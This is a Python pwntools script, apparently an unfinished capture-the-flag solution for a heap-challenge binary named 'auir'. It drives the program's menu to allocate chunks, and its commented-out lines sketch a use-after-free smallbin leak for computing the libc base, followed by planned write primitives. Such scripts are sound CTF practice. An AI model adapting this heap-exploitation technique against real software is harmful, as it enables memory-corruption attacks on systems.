#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = "fish"

class auirPwn:
	def __init__(self, p):
		self.p = p
		self.index = 0

	def add_zealot(self, size, skills):
		self.p.sendline('1')
		self.p.recvuntil('>>')
		self.p.sendline(str(size))
		self.p.recvuntil('>>')
		self.p.sendline(str(skills))
		self.p.recvuntil('>>')
		log.info("[add_zealot] size:%d, index:%d" % (size, self.index))
		self.index+=1
		return self.index-1

	def destroy_zealot(self, index):
		self.p.sendline('2')
		self.p.recvuntil('>>')
		self.p.sendline(str(index))
		self.p.recvuntil('>>')
		log.info("[destroy_zealot] index:%d" % index)

	def fix_zealot(self, index, size, skills):
		self.p.sendline('3')
		self.p.recvuntil('>>')
		self.p.sendline(str(index))
		self.p.recvuntil('>>')
		self.p.sendline(str(size))
		self.p.recvuntil('>>')
		self.p.sendline(str(skills))
		self.p.recvuntil('>>')
		log.info("[fix_zealot] index:%d, size:%d" % (index, size))
	
	def display_zealot(self, index):
		self.p.sendline('4')
		self.p.recvuntil('>>')
		self.p.sendline(str(index))
		self.p.recvline()
		skills = self.p.recvuntil('|---------', drop=True)
		skills = skills.replace('>>[*]SHOWING....\n', '')
		self.p.recvuntil('>>')
		log.info("[display_zealot] index:%d" % index)
		return skills
	

# r = listen(1111, 'localhost')
# r.wait_for_connection()

r = process('./auir')
# r = process('./auir', env={'LD_PRELOAD': './libc-2.23.so'})
print r.pid
print r.recvuntil("|-------------------------------|")
a = auirPwn(r)

# Let's get the smallbin leak!!
z1 = a.add_zealot(215, '1'*8)
z2 = a.add_zealot(215, '2'*8)
z3 = a.add_zealot(215, '3'*8)
z4 = a.add_zealot(215, '4'*8)
z5 = a.add_zealot(215, '5'*8)
z6 = a.add_zealot(215, '6'*8)
z7 = a.add_zealot(215, '7'*8)
z8 = a.add_zealot(215, '8'*8)

r.interactive()
# a.destroy_zealot(z1)
# smallbin_leak = a.display_zealot(z1)

# print smallbin_leak.encode('hex')
# print 'leak'
# try:
# 	smallbin_leak = u64(smallbin_leak)
# 	log.success("Leaked smallbin addr: 0x%x" % smallbin_leak)
# 	libc_base = smallbin_leak -  0x3c4b78
# 	log.success("Leaked libc_base: 0x%x" % libc_base)
# except:
# 	print 'leak failed'

# # Now let's get write prims!
# z1 = a.add_zealot(215, 'a'*8) # restore z1
# sleep(1)
# gdb.attach(r.pid)

# import IPython; shell = IPython.terminal.embed.InteractiveShellEmbed(); shell.mainloop()
